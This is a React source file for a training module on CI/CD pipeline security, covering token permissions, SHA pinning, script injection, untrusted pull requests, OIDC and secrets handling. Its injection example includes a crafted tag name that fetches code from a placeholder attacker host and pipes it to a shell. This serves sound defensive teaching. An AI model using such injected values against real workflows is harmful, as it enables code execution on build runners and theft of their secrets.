import React from 'react';
import { Section, H3, P, Term, Callout, Pre, Code, Table, Recall } from '../components/ui';
import { C } from '../theme';

export default function SecuritySupplyChain() {
  return (
    <Section
      id="security"
      kicker="Module 08 · Pipeline Security"
      title="Your pipeline holds the keys to production. Defend it that way."
    >
      <P>
        A CI/CD system can write to your registry and cluster, and it runs third-party code on every
        commit. An attacker doesn't need to breach production if they can get a line of code into a
        workflow. Ask of each piece: <Term>what can it reach, and who controls its inputs?</Term>
      </P>

      <H3>Least privilege for GITHUB_TOKEN</H3>
      <P>
        The kit sets <Code>contents: read</Code> at the top of each workflow and grants more per job, so
        only <Code>build</Code> gets <Code>packages: write</Code>. Copy this pattern exactly.
      </P>
      <Pre label="default deny, then grant per job">{`permissions:
  contents: read

jobs:
  build:
    permissions: { contents: read, packages: write }`}</Pre>

      <H3>Pin actions to a commit SHA</H3>
      <P>
        A tag like <Code>@v5</Code> is a movable pointer that the action's owner, or anyone who steals
        their credentials, can redirect. This is no longer theoretical.
      </P>
      <Callout tone="warn" title="Case study: Trivy, March 2026">
        On 19 March 2026, an attacker with compromised credentials force-pushed most version tags in{' '}
        <Code>aquasecurity/trivy-action</Code> to malicious commits containing a credential stealer
        (CVE-2026-33634). Sources put it at 75 of 76 or 76 of 77 tags. Workflows using a tag ran it with
        access to their secrets, and Aqua's advice was to treat every secret reachable from those runs
        as exposed. A security scanner, in other words, became the attack path.
      </Callout>
      <Pre label="before and after">{`# Mutable: whoever controls the tag controls your runner
- uses: aquasecurity/trivy-action@0.33.1

# Immutable: reviewable, with the version kept as a comment
- uses: aquasecurity/trivy-action@<full-40-char-sha>  # 0.33.1`}</Pre>
      <P>
        GitHub calls full-length SHA pinning the most secure option for third-party actions, and offers
        a policy that requires it. Dependabot can keep pinned SHAs updated, and the kit already
        configures its <Code>github-actions</Code> ecosystem. Every external action in the kit currently
        uses a tag. Look up each SHA from the upstream repo yourself. Never copy one from a tutorial.
      </P>

      <H3>Script injection</H3>
      <P>
        GitHub substitutes <Code>{'${{ }}'}</Code> expressions <Term>before</Term> the shell runs, so a
        value becomes part of the script. Git allows characters like <Code>$(</Code> in tag names:
      </P>
      <Pre label="vulnerable — .github/workflows/cd.yml">{`- id: v
  run: echo "version=\${{ github.event.release.tag_name || inputs.version }}" >> "$GITHUB_OUTPUT"

# A tag named  v1$(curl attacker.example | sh)  runs that command on the runner.`}</Pre>
      <Pre label="fixed — pass through env, then validate">{`- id: v
  env:
    VERSION: \${{ github.event.release.tag_name || inputs.version }}
  run: |
    [[ "$VERSION" =~ ^v[0-9]+\\.[0-9]+\\.[0-9]+$ ]] || { echo "bad version"; exit 1; }
    echo "version=$VERSION" >> "$GITHUB_OUTPUT"`}</Pre>
      <P>
        An environment variable is data to the shell, not code. Creating a release takes write access
        here, so the blast radius is limited, but stolen tokens and AI agents both make "only trusted
        people can do this" a weaker assumption. Treat branch names, PR titles and issue text as hostile
        in the same way. CodeQL and <Code>zizmor</Code> can flag this pattern.
      </P>

      <H3>Untrusted pull requests</H3>
      <Table
        head={['Event', 'Runs', 'Has secrets?', 'Rule']}
        rows={[
          ['pull_request', 'PR\'s workflow and code', 'Not from forks', 'The safe default'],
          ['pull_request_target', 'Base branch workflow', 'Yes', 'Never check out or run PR code'],
        ]}
      />
      <P>
        <Code>gate-guard.yml</Code> uses <Code>pull_request_target</Code> safely: it has no checkout
        step, and reads only event metadata via the GitHub API. <Code>preview.yml</Code> and{' '}
        <Code>claude-review.yml</Code> check that the head repo matches, so forks never reach credentials.
      </P>

      <H3>Short-lived credentials over stored keys</H3>
      <P>
        The kit stores a base64 kubeconfig per environment. It works, and environment scoping limits
        exposure, but it's a long-lived credential that can leak and must be rotated by hand. With{' '}
        <Term color={C.green}>OIDC</Term>, GitHub issues the job a signed identity token, and your cloud
        exchanges it for credentials valid only for that job. There's nothing stored to steal.
      </P>
      <Pre label="OIDC on AWS EKS (illustrative)">{`permissions:
  id-token: write          # may request a token, grants no cloud access itself
  contents: read
steps:
  - uses: aws-actions/configure-aws-credentials@<sha>
    with:
      role-to-assume: arn:aws:iam::123456789012:role/deploy-prod
      aws-region: eu-west-1
  - run: aws eks update-kubeconfig --name prod-cluster`}</Pre>
      <P>
        The cloud role must check the token's claims, restricting by repo and ideally by environment, or
        another repository could assume it. Also give the deploy identity a Kubernetes role limited to
        its namespace, instead of cluster-admin.
      </P>

      <H3>Secrets flow</H3>
      <Pre label="how a secret reaches a pod, and where it never goes">{`Secret store ─▶ External Secrets Operator ─▶ K8s Secret ─▶ envFrom ─▶ pod
                                                 │
never in: Git, values files, images, CI logs, harness reports`}</Pre>
      <Table
        head={['Control', 'Kit mechanism']}
        rows={[
          ['Secrets out of Git', 'ExternalSecret, with key names only in config'],
          ['Harness cannot read values', 'Go-template prints key names only'],
          ['Reports stay clean', 'redact() on all logs'],
          ['Commits scanned', 'Trivy secret scanner in security.yml'],
          ['Accident prevention', 'scan_values_for_secrets in preflight'],
        ]}
      />
      <Callout tone="warn" title="Rotation doesn't restart pods">
        <Code>envFrom</Code> reads a Secret at container start. When External Secrets refreshes it, running
        pods keep the old value. Rotation needs a rollout: use{' '}
        <Code>kubectl rollout restart</Code>, or a controller such as Stakater Reloader. Mounted Secret
        files do update, if the app re-reads them.
      </Callout>
      <Callout tone="info" title="Kubernetes Secrets are not encrypted by default">
        They're base64-encoded, and encrypted at rest only if the cluster is configured to do so. Limit
        who can read them with RBAC.
      </Callout>

      <H3>Know what you shipped</H3>
      <Table
        head={['Layer', 'Kit', 'Next step']}
        rows={[
          ['SBOM', 'sbom: true on image build', 'Keep and query it when a CVE lands'],
          ['Provenance', 'provenance: true', 'Verify before deploy'],
          ['Image scan', 'Trivy after push', 'Scan before push, or block unscanned digests'],
          ['Source scan', 'CodeQL, pnpm audit, pip-audit', 'Keep in required checks'],
          ['Signing', 'None', 'Cosign with keyless signing'],
          ['Admission', 'None', 'Kyverno or similar rejects unsigned images'],
        ]}
      />
      <P>
        Admission control completes the chain: it's the only control still enforced when someone
        bypasses the pipeline and runs <Code>kubectl</Code> directly.
      </P>

      <Recall
        items={[
          ['What exactly did the Trivy incident exploit?', 'Tags are mutable. Workflows pinned to a tag ran whatever it pointed at when the job started.'],
          ['Why does moving an expression to env: fix injection?', 'The value is no longer pasted into the script text. The shell sees a variable, not code.'],
          ['Does id-token: write give a job cloud access?', 'No. It only lets the job request an identity token. Access comes from the role that trusts that token.'],
          ['You rotate a database password in the store. When do pods get it?', 'Not until they restart, because envFrom is read at startup.'],
        ]}
      />
    </Section>
  );
}
